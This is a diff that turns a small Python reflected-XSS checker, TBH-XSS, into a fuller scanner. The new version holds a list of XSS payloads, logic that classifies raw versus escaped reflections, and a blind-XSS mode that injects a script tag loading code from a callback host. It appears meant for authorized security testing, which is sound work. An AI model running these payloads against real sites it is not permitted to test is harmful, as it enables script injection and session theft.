@@ -1,47 +1,201 @@
 #!/usr/bin/env python3
-# TBH-XSS - Reflected XSS Checker (Educational - Only Authorized)
-import requests, argparse, json, urllib.parse
+"""TBH-XSS v3 - Reflected XSS detector (authorized testing only)."""
+import argparse, json, os, sys, time, urllib.parse
 
-BANNER = """\033[91m╔════════════════════════════════════╗
-\033[91m║ \033[97mTBH-XSS \033[91m- Detector                \033[91m║
-\033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
-\033[91m╚════════════════════════════════════╝\033[0m"""
+try:
+    import requests
+except ImportError:
+    print("[!] requests required: pip install requests", file=sys.stderr)
+    sys.exit(2)
 
-PAYLOAD = "<svg/onload=alert(1)>"
+VERSION = "3.0"
+REPO = "https://github.com/TulungagungBlackHat/TBH-XSS"
 
-def check(url):
-    # Try inject payload as q param
-    parsed=urllib.parse.urlparse(url)
-    qs=urllib.parse.parse_qs(parsed.query)
-    test_url=url
-    if not qs:
-        test_url=f"{url}?q={urllib.parse.quote(PAYLOAD)}"
-    else:
-        # Replace first param value
-        k=list(qs.keys())[0]
-        qs[k]=PAYLOAD
-        test_url=urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)))
+def banner():
+    if os.environ.get("NO_COLOR"):
+        return ""
+    return ("\033[91m╔════════════════════════════════════╗\n"
+            "║ \033[97mTBH-XSS v3\033[91m - Reflected XSS         \033[91m║\n"
+            "║ \033[90mTulungagung Black Hat | uchil404 \033[91m║\n"
+            "╚════════════════════════════════════╝\033[0m")
+
+def color(code, text, enabled=True):
+    return f"\033[{code}m{text}\033[0m" if enabled else text
+
+PAYLOADS = [
+    "<svg/onload=alert(1)>",
+    "'-alert(1)-'",
+    '"><img src=x onerror=alert(1)>',
+    "<script>alert(document.domain)</script>",
+    "tbhxssCANARY",
+]
+ENCODERS = {
+    "raw": lambda s: s,
+    "url": urllib.parse.quote,
+}
+
+def build_session(args):
+    s = requests.Session()
+    s.headers["User-Agent"] = f"TBH-XSS/{VERSION} (+{REPO})"
+    if args.cookie:
+        s.headers["Cookie"] = args.cookie
+    for h in args.header or []:
+        name, _, val = h.partition(":")
+        if not val:
+            raise SystemExit(f"[!] bad -H value: {h!r} (expected 'Name: value')")
+        s.headers[name.strip()] = val.strip()
+    if args.proxy:
+        s.proxies = {"http": args.proxy, "https": args.proxy}
+    return s
+
+def inject(url, param, value):
+    p = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
+    if param is None:
+        if not qs:
+            param = "q"
+        else:
+            param = next(iter(qs))
+    qs[param] = [value]
+    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs, doseq=True))), param
+
+def target_params(url, requested):
+    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query, keep_blank_values=True)
+    if requested and requested != "all":
+        return [requested]
+    return list(qs.keys()) or ["q"]
+
+def classify_reflection(body, payload):
+    """Return None (no reflection), 'escaped', or 'raw'."""
+    if payload in body:
+        return "raw"
+    encoded_variants = [
+        urllib.parse.quote(payload, safe=""),
+        urllib.parse.quote(payload),
+        payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;"),
+    ]
+    for v in encoded_variants:
+        if v and v in body:
+            return "escaped"
+    return None
+
+def scan(session, url, args, use_color):
+    findings = []
+    params = target_params(url, args.param)
+    baseline = None
     try:
-        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-XSS/1.0'})
-        reflected=PAYLOAD in r.text or urllib.parse.quote(PAYLOAD) in r.text or "&lt;svg" in r.text
-        return {"url":test_url,"status":r.status_code,"reflected":reflected,"length":len(r.text)}
-    except Exception as e:
-        return {"url":test_url,"error":str(e),"reflected":False}
+        r = session.get(url, timeout=args.timeout, allow_redirects=True)
+        baseline = {"status": r.status_code, "length": len(r.text)}
+    except requests.RequestException as e:
+        return {"error": f"baseline failed: {e}"}
+
+    for param in params:
+        for payload in PAYLOADS:
+            test_url, _ = inject(url, param, payload)
+            try:
+                r = session.get(test_url, timeout=args.timeout, allow_redirects=True)
+            except requests.RequestException as e:
+                findings.append({"param": param, "payload": payload, "url": test_url,
+                                 "error": str(e), "verdict": "error"})
+                continue
+            kind = classify_reflection(r.text, payload)
+            if kind == "raw":
+                verdict = "potential-xss" if payload != "tbhxssCANARY" else "reflection"
+                findings.append({
+                    "param": param, "payload": payload, "url": test_url,
+                    "status": r.status_code, "length": len(r.text),
+                    "baseline": baseline, "reflection": kind, "verdict": verdict,
+                })
+            elif kind == "escaped":
+                findings.append({
+                    "param": param, "payload": payload, "url": test_url,
+                    "status": r.status_code, "reflection": kind, "verdict": "escaped",
+                })
+            if args.delay:
+                time.sleep(args.delay)
+
+    if args.blind:
+        cb = args.blind.rstrip("/")
+        for param in params:
+            payload = f"<script src={cb}/x.js></script>"
+            test_url, _ = inject(url, param, payload)
+            try:
+                session.get(test_url, timeout=args.timeout, allow_redirects=True)
+                findings.append({"param": param, "payload": payload, "url": test_url,
+                                 "verdict": "blind-sent", "callback": cb})
+            except requests.RequestException as e:
+                findings.append({"param": param, "payload": payload, "url": test_url,
+                                 "verdict": "error", "error": str(e)})
+            if args.delay:
+                time.sleep(args.delay)
+
+    return {"tool": "TBH-XSS", "version": VERSION, "target": url,
+            "baseline": baseline, "findings": findings}
 
 def main():
-    print(BANNER)
-    print("\033[91m[!] Hanya untuk scope yang diizinkan! Test XSS dengan payload aman.\033[0m\n")
-    parser=argparse.ArgumentParser(description="XSS Detector")
-    parser.add_argument("-u","--url",required=True)
-    parser.add_argument("--json",help="Save JSON")
-    args=parser.parse_args()
-    print(f"[*] Testing {args.url} dengan payload: {PAYLOAD}")
-    result=check(args.url)
-    if result.get("reflected"):
-        print(f"\033[91m[!] Reflected! {result['url']} -> {result['status']} - Potensi XSS, cek manual!\033[0m")
-    else:
-        print(f"\033[92m[✓] Tidak reflected [{result.get('status')}] - mungkin aman / butuh bypass\033[0m")
-    if args.json:
-        open(args.json,'w').write(json.dumps(result,indent=2)); print(f"[✓] JSON: {args.json}")
+    parser = argparse.ArgumentParser(description=f"TBH-XSS v{VERSION} - reflected XSS detector")
+    parser.add_argument("-u", "--url", required=True)
+    parser.add_argument("--param", help="parameter name, or 'all' (default: first param)")
+    parser.add_argument("--blind", metavar="CALLBACK", help="send blind-XSS payloads pointing at callback URL")
+    parser.add_argument("--proxy", help="e.g. http://127.0.0.1:8080 (Burp)")
+    parser.add_argument("--cookie", help="Cookie header value")
+    parser.add_argument("-H", "--header", action="append", help="extra header, repeatable")
+    parser.add_argument("--timeout", type=float, default=10.0)
+    parser.add_argument("--delay", type=float, default=0.0, help="seconds between requests")
+    parser.add_argument("--json", help="save JSON report")
+    parser.add_argument("--no-color", action="store_true")
+    parser.add_argument("--version", action="version", version=f"TBH-XSS {VERSION}")
+    args = parser.parse_args()
+    print(banner())
 
-if __name__=="__main__": main()
+    use_color = not args.no_color and not os.environ.get("NO_COLOR")
+    print(color("91", "[!] Authorized targets only.", use_color))
+    print(f"[*] Scanning {args.url} (params: {args.param or 'auto'})")
+    try:
+        session = build_session(args)
+    except SystemExit as e:
+        print(e, file=sys.stderr)
+        sys.exit(2)
+
+    report = scan(session, args.url, args, use_color)
+
+    if "error" in report:
+        print(color("91", f"[!] {report['error']}", use_color))
+        sys.exit(2)
+
+    vulnerable = escaped = 0
+    for f in report["findings"]:
+        v = f.get("verdict")
+        line = f"[{v}] {f.get('param')} -> {f.get('status', '-')} {f.get('url', '')[:80]}"
+        if v == "potential-xss":
+            vulnerable += 1
+            print(color("91", f"[!] {line} payload={f['payload']!r}", use_color))
+        elif v == "reflection":
+            vulnerable += 1
+            print(color("93", f"[?] {line} (canary reflected, check context)", use_color))
+        elif v == "escaped":
+            escaped += 1
+            print(color("90", f"[-] {line} (encoded)", use_color))
+        elif v == "blind-sent":
+            print(color("96", f"[*] blind payload sent to {f['url'][:80]} - watch {f['callback']}", use_color))
+        elif v == "error":
+            print(color("90", f"[-] {f.get('param')}: {f.get('error')}", use_color))
+
+    if args.json:
+        report["summary"] = {"potential_xss": vulnerable, "escaped": escaped}
+        try:
+            with open(args.json, "w") as fh:
+                json.dump(report, fh, indent=2)
+            print(f"[✓] JSON: {args.json}")
+        except OSError as e:
+            print(color("91", f"[!] cannot write JSON: {e}", use_color), file=sys.stderr)
+            sys.exit(2)
+
+    if vulnerable:
+        print(color("91", f"[!] {vulnerable} potential reflection(s) - verify context manually", use_color))
+        sys.exit(1)
+    print(color("92", f"[✓] No raw reflections ({escaped} escaped)", use_color))
+    sys.exit(0)
+
+if __name__ == "__main__":
+    main()
